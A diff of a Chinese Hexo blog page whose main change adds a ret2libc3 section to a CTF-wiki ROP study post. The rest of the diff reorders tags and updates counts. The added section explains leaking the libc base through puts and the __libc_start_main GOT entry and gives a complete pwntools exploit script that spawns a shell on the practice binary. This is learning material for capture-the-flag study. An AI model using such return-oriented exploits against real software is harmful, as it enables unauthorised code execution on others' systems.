@@ -133,7 +133,7 @@
     
         
             
-            <li><div data-rel="代码审计">代码审计<small>(2)</small></div>
+            <li><div data-rel="PWN">PWN<small>(1)</small></div>
                 
             </li>
             
@@ -141,7 +141,7 @@
     
         
             
-            <li><div data-rel="PWN">PWN<small>(1)</small></div>
+            <li><div data-rel="代码审计">代码审计<small>(2)</small></div>
                 
             </li>
             
@@ -166,7 +166,7 @@
     <div><a class="about  hasFriend  site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
 </div>
 <input type="hidden" id="yelog_site_posts_number" value="3">
-<input type="hidden" id="yelog_site_word_count" value="2k">
+<input type="hidden" id="yelog_site_word_count" value="2.3k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -198,19 +198,19 @@
     <div class="tags-list">
     
     <li class="article-tag-list-item">
-        <a class="color5">代码审计</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color5">漏洞复现</a>
-    </li>
-    
-    <li class="article-tag-list-item">
         <a class="color4">PWN</a>
     </li>
     
     <li class="article-tag-list-item">
         <a class="color4">ROP</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">代码审计</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">漏洞复现</a>
     </li>
     
     <div class="clearfix"></div>
@@ -223,20 +223,20 @@
     
     <nav id="title-list-nav">
         
-        <a  class="代码审计 漏洞复现 "
-           href="/2019/11/17/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"
-           data-tag="代码审计,漏洞复现"
-           data-author="" >
-            <span class="post-title" title="PHP代码审计环境搭建">PHP代码审计环境搭建</span>
-            <span class="post-date" title="2019-11-17 23:46:05">2019/11/17</span>
-        </a>
-        
         <a  class="PWN "
            href="/2019/11/26/ROP-CTFwiki/"
            data-tag="PWN,ROP"
            data-author="" >
             <span class="post-title" title="ROP - CTFwiki">ROP - CTFwiki</span>
             <span class="post-date" title="2019-11-26 23:21:07">2019/11/26</span>
+        </a>
+        
+        <a  class="代码审计 漏洞复现 "
+           href="/2019/11/17/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"
+           data-tag="代码审计,漏洞复现"
+           data-author="" >
+            <span class="post-title" title="PHP代码审计环境搭建">PHP代码审计环境搭建</span>
+            <span class="post-date" title="2019-11-17 23:46:05">2019/11/17</span>
         </a>
         
         <a  class="代码审计 漏洞复现 "
@@ -285,12 +285,12 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-12-06 01:56:21'>2019-11-26 23:21</time>
+        创建时间:<time class="date" title='更新时间: 2019-12-06 03:45:58'>2019-11-26 23:21</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:1k</span>
+        <span>字数:1.4k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -491,6 +491,56 @@ p.interactive()</code></pre>
 <h3 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h3><blockquote>
 <p>程序下载链接： <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3</a></p>
 </blockquote>
+<p>这一次没有 system 也没有 /bin/sh。梳理一下我们要做的事：</p>
+<ol>
+<li>先用一次 ROP return 到 puts ，泄漏 libcbase addr，其实也就是先用 puts 等函数印出一个已经调用过的函数的 got ，并 return 回 main，再减去该函数在 libc 中的 offset，offset 可以通过 readelf -s 等方式得到。(通常选择<code>__libc_start_main</code>，因为它是 main 函数的调用者，必定已经调用过)</li>
+<li>拿到 libcbase addr，就可以加上 system 在 libc 中的 offset，通过 libcbase + system offset 拿到 system addr</li>
+<li>同理，用 /bin/sh 的 offset + libcbase 得到 /bin/sh 的 addr</li>
+<li>再一次 ROP 回 main，用 system 和 /bin/sh 开 shell</li>
+</ol>
+<p>栈布局：</p>
+<pre><code class="python">- ROP1:
+padding1 # 112
+puts@plt
+main@plt
+__libc_start_main@got
+
+- ROP2:
+padding2 # 104
+system@plt
+0xdeadbeef # anything 4 bytes
+/bin/sh addr</code></pre>
+<p>exp:</p>
+<pre><code class="python">from pwn import *
+from LibcSearcher import *
+p = process(&quot;./ret2libc3&quot;)
+# p = remote(&quot;127.0.0.1&quot;,4000)
+context.log_level = &#39;debug&#39;
+context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
+
+elf = ELF(&quot;./ret2libc3&quot;)
+
+# gdb.attach(p)
+puts_plt = elf.symbols[&#39;puts&#39;]
+main_plt = elf.symbols[&#39;main&#39;]
+libc_start_main_got = elf.got[&#39;__libc_start_main&#39;]
+payload1 = &#39;a&#39;*112 + p32(puts_plt)+p32(main_plt) + p32(libc_start_main_got)
+p.sendlineafter(&quot;Can you find it !?&quot;,payload1)
+
+libc_start_main_addr = u32(p.recv()[0:4])
+# print libc_start_main_addr
+
+
+libc = LibcSearcher(&quot;__libc_start_main&quot;,libc_start_main_addr)
+libcbase = libc_start_main_addr - libc.dump(&#39;__libc_start_main&#39;)
+
+system_addr = libcbase + libc.dump(&#39;system&#39;)
+sh_addr = libcbase + libc.dump(&#39;str_bin_sh&#39;)
+payload2 = &#39;a&#39;*104 + p32(system_addr) + p32(0xdeadbeef) + p32(sh_addr)
+
+p.sendline(payload2)
+p.interactive()</code></pre>
+<p>其中选择：ubuntu-xenial-i386-libc6 (id libc6_2.23-0ubuntu10_i386)，也就是 3</p>
 <h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote>
 <p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/#ret2shellcode" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/#ret2shellcode</a></p>
 </blockquote>
@@ -504,10 +554,10 @@ p.interactive()</code></pre>
 
 <div class="article_copyright">
     <p><span class="copy-title">文章标题:</span>ROP - CTFwiki</p>
-    <p><span class="copy-title">文章字数:</span><span class="post-count">1k</span></p>
+    <p><span class="copy-title">文章字数:</span><span class="post-count">1.4k</span></p>
     <p><span class="copy-title">本文作者:</span><a  title="知弦">知弦</a></p>
     <p><span class="copy-title">发布时间:</span>2019-11-26, 23:21:07</p>
-    <p><span class="copy-title">最后更新:</span>2019-12-06, 01:56:21</p>
+    <p><span class="copy-title">最后更新:</span>2019-12-06, 03:45:58</p>
     <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/11/26/ROP-CTFwiki/" title="ROP - CTFwiki">http://zh1x1an.com/2019/11/26/ROP-CTFwiki/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
@@ -604,7 +654,7 @@ p.interactive()</code></pre>
     /*作者、标签的自动补全*/
     $(function () {
         $('.search').AutoComplete({
-            'data': ['#代码审计','#漏洞复现','#PWN','#ROP',],
+            'data': ['#PWN','#ROP','#代码审计','#漏洞复现',],
             'itemHeight': 20,
             'width': 418
         }).AutoComplete('show');
